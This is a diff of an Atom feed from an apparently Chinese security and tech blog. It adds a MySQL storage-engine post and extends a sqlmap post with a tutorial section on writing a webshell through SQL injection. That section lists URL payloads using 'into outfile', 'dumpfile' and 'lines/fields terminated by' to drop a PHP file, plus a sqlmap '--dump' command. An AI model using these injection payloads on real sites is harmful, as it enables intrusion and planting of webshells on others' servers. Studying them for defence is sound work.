@@ -1,11 +1,153 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-19T02:43:18-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-22T09:10:28-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
 &lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
   &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
 &lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
   &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
 &lt;/a&gt;
-</subtitle><entry><title type="html">密码学基础总结</title><link href="http://localhost:4000/_posts/2020-07-19-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/" rel="alternate" type="text/html" title="密码学基础总结" /><published>2020-07-19T00:00:00-04:00</published><updated>2020-07-19T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-19-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/">&lt;p&gt;[toc]&lt;/p&gt;
+</subtitle><entry><title type="html">MySql存储引擎</title><link href="http://localhost:4000/_posts/2020-07-22-MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/" rel="alternate" type="text/html" title="MySql存储引擎" /><published>2020-07-22T00:00:00-04:00</published><updated>2020-07-22T00:00:00-04:00</updated><id>http://localhost:4000/_posts/MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-22-MySql%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/">&lt;p&gt;[toc]&lt;/p&gt;
+
+&lt;h1 id=&quot;什么是存储引擎&quot;&gt;什么是存储引擎&lt;/h1&gt;
+
+&lt;p&gt;数据库存储引擎是数据库底层软件组件，数据库管理系统使用数据引擎进行创建、查询、更新和删除数据操作。不同的存储引擎提供不同的存储机制、索引技巧、锁定水平等功能，使用不同的存储引擎还可以获得特定的功能。&lt;/p&gt;
+
+&lt;p&gt;现在许多数据库管理系统都支持多种不同的存储引擎。MySQL 的核心就是存储引擎。&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;提示：InnoDB 事务型数据库的首选引擎，支持事务安全表（ACID），支持行锁定和外键。MySQL 5.5.5 之后，InnoDB 作为默认存储引擎&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;MyISAM 是基于 ISAM 的存储引擎，并对其进行扩展，是在 Web、数据仓储和其他应用环境下最常使用的存储引擎之一。MyISAM 拥有较高的插入、查询速度，但不支持事务。&lt;/p&gt;
+
+&lt;p&gt;MEMORY 存储引擎将表中的数据存储到内存中，为查询和引用其他数据提供快速访问。&lt;/p&gt;
+
+&lt;h1 id=&quot;mysql-57-支持的存储引擎&quot;&gt;MySQL 5.7 支持的存储引擎&lt;/h1&gt;
+
+&lt;p&gt;MySQL 支持多种类型的数据库引擎，可分别根据各个引擎的功能和特性为不同的数据库处理任务提供各自不同的适应性和灵活性。在 MySQL 中，可以利用 &lt;code&gt;SHOW ENGINES&lt;/code&gt; 语句来显示可用的数据库引擎和默认引擎。&lt;/p&gt;
+
+&lt;p&gt;MySQL 提供了多个不同的存储引擎，包括处理事务安全表的引擎和处理非事务安全表的引擎。在 MySQL 中，不需要在整个服务器中使用同一种存储引擎，针对具体的要求，可以对每一个表使用不同的存储引擎。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Support 列的值表示某种引擎是否能使用，&lt;code&gt;YES&lt;/code&gt;表示可以使用，&lt;code&gt;NO&lt;/code&gt;表示不能使用，&lt;code&gt;DEFAULT&lt;/code&gt;表示该引擎为当前默认的存储引擎。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;如何选择-mysql-存储引擎&quot;&gt;如何选择 MySQL 存储引擎&lt;/h1&gt;
+
+&lt;p&gt;不同的存储引擎都有各自的特点，以适应不同的需求，如表所示。为了做出选择，首先要考虑每一个存储引擎提供了哪些不同的功能。&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;功能&lt;/th&gt;
+      &lt;th&gt;MylSAM&lt;/th&gt;
+      &lt;th&gt;MEMORY&lt;/th&gt;
+      &lt;th&gt;InnoDB&lt;/th&gt;
+      &lt;th&gt;Archive&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;存储限制&lt;/td&gt;
+      &lt;td&gt;256TB&lt;/td&gt;
+      &lt;td&gt;RAM&lt;/td&gt;
+      &lt;td&gt;64TB&lt;/td&gt;
+      &lt;td&gt;None&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;支持事务&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+      &lt;td&gt;Yes&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;支持全文索引&lt;/td&gt;
+      &lt;td&gt;Yes&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;支持树索引&lt;/td&gt;
+      &lt;td&gt;Yes&lt;/td&gt;
+      &lt;td&gt;Yes&lt;/td&gt;
+      &lt;td&gt;Yes&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;支持哈希索引&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+      &lt;td&gt;Yes&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;支持数据缓存&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+      &lt;td&gt;N/A&lt;/td&gt;
+      &lt;td&gt;Yes&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;支持外键&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+      &lt;td&gt;Yes&lt;/td&gt;
+      &lt;td&gt;No&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;1、事务安全
+InnoDB支持事务安全,MyISAM和MEMORY两个不支持。&lt;/p&gt;
+
+&lt;p&gt;2、储存限制
+InnoDB有64TB的存储限制，MyISAM和MEMORY要是具体情况而定。&lt;/p&gt;
+
+&lt;p&gt;3、空间使用
+InnoDB对空间使用程度较高，MyISAM和MEMORY对空间使用程度较低。&lt;/p&gt;
+
+&lt;p&gt;4、内存使用
+InnoDB和MEMORY对内存使用程度较高，MyISAM对内存使用程度较低。&lt;/p&gt;
+
+&lt;p&gt;5、插入数据的速度：
+InnoDB插入数据的速度较低，MyISAM和MEMORY插入数据的速度较高。&lt;/p&gt;
+
+&lt;p&gt;6、对外键的支持：
+InnoDB对外键支持情况较好，MyISAM和MEMORY两个不支持外键。&lt;/p&gt;
+
+&lt;p&gt;可以根据以下的原则来选择 MySQL 存储引擎：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;如果要提供提交、回滚和恢复的事务安全（ACID 兼容）能力，并要求实现并发控制，InnoDB 是一个很好的选择。&lt;/li&gt;
+  &lt;li&gt;如果数据表主要用来插入和查询记录，则 MyISAM 引擎提供较高的处理效率。&lt;/li&gt;
+  &lt;li&gt;如果只是临时存放数据，数据量不大，并且不需要较高的数据安全性，可以选择将数据保存在内存的 MEMORY 引擎中，MySQL 中使用该引擎作为临时表，存放查询的中间结果。&lt;/li&gt;
+  &lt;li&gt;如果只有 INSERT 和 SELECT 操作，可以选择Archive 引擎，Archive 存储引擎支持高并发的插入操作，但是本身并不是事务安全的。Archive 存储引擎非常适合存储归档数据，如记录日志信息可以使用 Archive 引擎。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;三种引擎特点如下：
+1、InnoDB存储引擎InnoDB是事务型数据库的首选引擎，支持事务安全表（ACID），其它存储引擎都是非事务安全表，支持行锁定和外键，MySQL5.5以后默认使用InnoDB存储引擎。&lt;/p&gt;
+
+&lt;p&gt;InnoDB特点： 支持事务处理，支持外键，支持崩溃修复能力和并发控制。如果需要对事务的完整性要求比较高（比如银行），要求实现并发控制（比如售票），那选择InnoDB有很大的优势。&lt;/p&gt;
+
+&lt;p&gt;如果需要频繁的更新、删除操作的数据库，也可以选择InnoDB，因为支持事务的提交（commit）和回滚（rollback）。&lt;/p&gt;
+
+&lt;p&gt;2、MyISAM存储引擎 MyISAM基于ISAM存储引擎，并对其进行扩展。它是在Web、数据仓储和其他应用环境下最常使用的存储引擎之一。MyISAM拥有较高的插入、查询速度，但不支持事务，不支持外键。&lt;/p&gt;
+
+&lt;p&gt;MyISAM特点： 插入数据快，空间和内存使用比较低。如果表主要是用于插入新记录和读出记录，那么选择MyISAM能实现处理高效率。如果应用的完整性、并发性要求比较低，也可以使用&lt;/p&gt;
+
+&lt;p&gt;3、MEMORY存储引擎 MEMORY存储引擎将表中的数据存储到内存中，为查询和引用其他表数据提供快速访问。&lt;/p&gt;
+
+&lt;p&gt;MEMORY特点： 所有的数据都在内存中，数据的处理速度快，但是安全性不高。如果需要很快的读写速度，对数据的安全性要求较低，可以选择MEMOEY。&lt;/p&gt;
+
+&lt;p&gt;它对表的大小有要求，不能建立太大的表。所以，这类数据库只使用在相对较小的数据库表。&lt;/p&gt;
+
+&lt;h1 id=&quot;mysql-默认存储引擎&quot;&gt;MySQL 默认存储引擎&lt;/h1&gt;
+
+&lt;p&gt;nnoDB 是系统的默认引擎，支持可靠的事务处理。&lt;/p&gt;
+
+&lt;p&gt;使用下面的语句可以修改数据库临时的默认存储引擎&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;SET default_storage_engine=&amp;lt; 存储引擎名 &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="sql" /><summary type="html">[toc]</summary></entry><entry><title type="html">密码学基础总结</title><link href="http://localhost:4000/_posts/2020-07-19-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/" rel="alternate" type="text/html" title="密码学基础总结" /><published>2020-07-19T00:00:00-04:00</published><updated>2020-07-19T00:00:00-04:00</updated><id>http://localhost:4000/_posts/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-19-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93/">&lt;p&gt;[toc]&lt;/p&gt;
 &lt;h1 id=&quot;基础概念&quot;&gt;基础概念&lt;/h1&gt;
 
 &lt;h2 id=&quot;信息安全三要素cia&quot;&gt;信息安全三要素（CIA）&lt;/h2&gt;
@@ -2512,7 +2654,62 @@ Options:
 &lt;h2 id=&quot;指定库名表名字段dump出指定字段&quot;&gt;指定库名表名字段dump出指定字段&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sqlmap -u URL -D 数据库名称 -T 表名 -C 字段...--dump
-&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">nmap</title><link href="http://localhost:4000/_posts/2020-07-12-nmap/" rel="alternate" type="text/html" title="nmap" /><published>2020-07-12T00:00:00-04:00</published><updated>2020-07-12T00:00:00-04:00</updated><id>http://localhost:4000/_posts/nmap</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-12-nmap/">&lt;p&gt;[toc]&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&quot;sql注入写webshell&quot;&gt;SQL注入写WebShell&lt;/h1&gt;
+
+&lt;h2 id=&quot;sql写webshell条件&quot;&gt;SQL写WebShell条件&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;在&lt;a href=&quot;https://www.uedbox.com/post/tag/mysql/&quot;&gt;mysql&lt;/a&gt;的配置文件 my.ini 中，&lt;code&gt;secure_file_priv=&quot;c:/wamp64/tmp&quot;&lt;/code&gt; 被注释 或者 ``secure_file_priv` 配置的位置是web目录。&lt;/li&gt;
+  &lt;li&gt;未开启全局gpc&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;sql注入点写webshell的5种方式&quot;&gt;SQL注入点写WebShell的5种方式&lt;/h2&gt;
+
+&lt;h3 id=&quot;union-select-后写入&quot;&gt;union select 后写入&lt;/h3&gt;
+
+&lt;p&gt;最常见的写入方式，union select 后跟 into outfile 语句&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=@ union select 1,2,3,4,'&amp;lt;?php phpinfo() ?&amp;gt;' into outfile 'path/webshell.php'
+urlid=@ union select 1,2,3,4,'&amp;lt;?php phpinfo() ?&amp;gt;' into dumpfile 'path/webshell.php'
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;lines-terminated-by-写入&quot;&gt;lines terminated by 写入&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' lines terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
+url?id=1 limit 1 into outfile 'path/webshell.php' lines terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;注入原理&quot;&gt;注入原理&lt;/h4&gt;
+
+&lt;p&gt;通过select语句查询的内容写入文件，也就是 &lt;code&gt;1 into outfile 'path/webshell.php'&lt;/code&gt; 这样写的原因，然后利用 &lt;code&gt;lines terminated by&lt;/code&gt; 语句拼接webshell的内容。&lt;code&gt;lines terminated by&lt;/code&gt; 可以理解为 &lt;strong&gt;以每行终止的位置添加 xx 内容&lt;/strong&gt;。&lt;/p&gt;
+
+&lt;h3 id=&quot;lines-starting-by-写入&quot;&gt;lines starting by 写入&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' lines starting by '&amp;lt;?php phpinfo() ?&amp;gt;'; 
+url?id=1 limit 1 into outfile 'path/webshell.php' lines starting by '&amp;lt;?php phpinfo() ?&amp;gt;';
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;注入原理-1&quot;&gt;注入原理&lt;/h4&gt;
+
+&lt;p&gt;利用 &lt;code&gt;lines starting by&lt;/code&gt; 语句拼接webshell的内容。&lt;code&gt;lines starting by&lt;/code&gt; 可以理解为 &lt;strong&gt;以每行开始的位置添加 xx 内容&lt;/strong&gt;。&lt;/p&gt;
+
+&lt;h3 id=&quot;fields-terminated-by-写入&quot;&gt;fields terminated by 写入&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' fields terminated by '&amp;lt;?php phpinfo() ?&amp;gt;'; 
+url?id=1 limit 1 into outfile 'path/webshell.php' fields terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;columns-terminated-by-写入&quot;&gt;COLUMNS terminated by 写入&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;url?id=1 into outfile 'path/webshell.php' COLUMNS terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
+url?id=1 limit 1 into outfile 'path/webshell.php' COLUMNS terminated by '&amp;lt;?php phpinfo() ?&amp;gt;';
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h4 id=&quot;注入原理-2&quot;&gt;注入原理&lt;/h4&gt;
+
+&lt;p&gt;利用 &lt;code&gt;fields terminated by&lt;/code&gt; 语句拼接webshell的内容。&lt;code&gt;fields terminated by&lt;/code&gt; 可以理解为 &lt;strong&gt;以每个字段的位置添加 xx 内容&lt;/strong&gt;。&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">nmap</title><link href="http://localhost:4000/_posts/2020-07-12-nmap/" rel="alternate" type="text/html" title="nmap" /><published>2020-07-12T00:00:00-04:00</published><updated>2020-07-12T00:00:00-04:00</updated><id>http://localhost:4000/_posts/nmap</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-12-nmap/">&lt;p&gt;[toc]&lt;/p&gt;
 
 &lt;blockquote&gt;
   &lt;p&gt;nmap是用来探测计算机网络上的主机和服务的一种安全扫描器。为了绘制网络拓扑图Nmap的发送特制的数据包到目标主机然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。&lt;/p&gt;
@@ -4650,94 +4847,4 @@ int main(int argc,char ** argv[])
 
 &lt;h1 id=&quot;测试结果&quot;&gt;测试结果&lt;/h1&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/5902.png&quot; alt=&quot;5902&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">HTTP请求方法</title><link href="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" rel="alternate" type="text/html" title="HTTP请求方法" /><published>2020-07-05T00:00:00-04:00</published><updated>2020-07-05T00:00:00-04:00</updated><id>http://localhost:4000/_posts/HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-05-HTTP%E5%8D%8F%E8%AE%AE%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/">&lt;p&gt;[toc]&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Http定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE。URL全称是资源描述符，我们可以这样认为：一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的查，改，增，删4个操作。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;主要方法&quot;&gt;主要方法&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;GET： 请求指定的页面信息，并返回实体主体。&lt;/li&gt;
-  &lt;li&gt;HEAD： 只请求页面的首部。&lt;/li&gt;
-  &lt;li&gt;POST： 请求服务器接受所指定的文档作为对所标识的URI的新的从属实体。&lt;/li&gt;
-  &lt;li&gt;PUT： 从客户端向服务器传送的数据取代指定的文档的内容。&lt;/li&gt;
-  &lt;li&gt;DELETE： 请求服务器删除指定的页面。&lt;/li&gt;
-  &lt;li&gt;OPTIONS： 允许客户端查看服务器的性能。&lt;/li&gt;
-  &lt;li&gt;TRACE： 请求服务器在响应中的实体主体部分返回所得到的内容。&lt;/li&gt;
-  &lt;li&gt;PATCH： 实体中包含一个表，表中说明与该URI所表示的原内容的区别。&lt;/li&gt;
-  &lt;li&gt;MOVE： 请求服务器将指定的页面移至另一个网络地址。&lt;/li&gt;
-  &lt;li&gt;COPY： 请求服务器将指定的页面拷贝至另一个网络地址。&lt;/li&gt;
-  &lt;li&gt;LINK： 请求服务器建立链接关系。&lt;/li&gt;
-  &lt;li&gt;UNLINK： 断开链接关系。&lt;/li&gt;
-  &lt;li&gt;WRAPPED： 允许客户端发送经过封装的请求。&lt;/li&gt;
-  &lt;li&gt;Extension-mothed：在不改动协议的前提下，可增加另外的方法&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h1 id=&quot;get请求&quot;&gt;GET请求&lt;/h1&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;根据HTTP规范，GET用于信息获取，而且应该是&lt;code&gt;安全的&lt;/code&gt;和&lt;code&gt;幂等的&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;所谓安全的意味着该操作用于获取信息而非修改信息。换句话说，GET 请求一般不应产生副作用。就是说，它仅仅是获取资源信息，就像数据库查询一样，不会修改，增加数据，不会影响资源的状态&lt;/p&gt;
-
-&lt;p&gt;幂等的意味着对同一URL的多个请求应该返回同样的结果。&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;幂等&lt;/strong&gt;是一个数学或计算机学概念，常见于抽象代数中&lt;/p&gt;
-
-  &lt;p&gt;对于单目运算，如果一个运算对于在范围内的所有的一个数多次进行该运算所得的结果和进行一次该运算所得的结果是一样的，那么我们就称该运算是幂等的。比如绝对值运算就是一个例子，在实数集中，有abs(a)=abs(abs(a))。对于双目运算，则要求当参与运算的两个值是等值的情况下，如果满足运算结果与参与运算的两个值相等，则称该运算幂等，如求两个数的最大值的函数，有在在实数集中幂等，即max(x,x) = x。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;post请求&quot;&gt;POST请求&lt;/h1&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;根据HTTP规范，POST表示可能修改变服务器上的资源的请求&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h1 id=&quot;get和post区别&quot;&gt;get和post区别&lt;/h1&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;GET在浏览器回退时是无害的，而POST会再次提交请求。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;GET产生的URL地址可以被Bookmark，而POST不可以。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;GET请求会被浏览器主动cache，而POST不会，除非手动设置。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;GET请求只能进行url编码，而POST支持多种编码方式。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;GET请求在URL中传送的参数是有长度限制的，而POST么有。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;对参数的数据类型，GET只接受ASCII字符，而POST没有限制。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;GET参数通过URL传递，POST放在Request body中&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;　&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;GET请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，参数之间以&amp;amp;相连，如：login.action?name=hyddd&amp;amp;password=idontknow&amp;amp;verify=%E4%BD%A0%E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如：%E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。
-POST把提交的数据则放置在是HTTP包的包体中
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;理论上讲，POST是没有大小限制的，HTTP协议规范也没有进行大小限制
-POST的安全性要比GET的安全性高。注意：这里所说的安全性和上面GET提到的“安全”不是同个概念。上面“安全”的含义仅仅是不作数据修改，而这里安全的含义是真正的Security的含义，比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存，(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击。
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;总结一下，Get是向服务器发索取数据的一种请求，而Post是向服务器提交数据的一种请求，在FORM（表单）中，Method默认为&quot;GET&quot;，实质上，GET和POST只是发送机制不同，并不是一个取一个发
-&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/img/5902.png&quot; alt=&quot;5902&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry></feed>
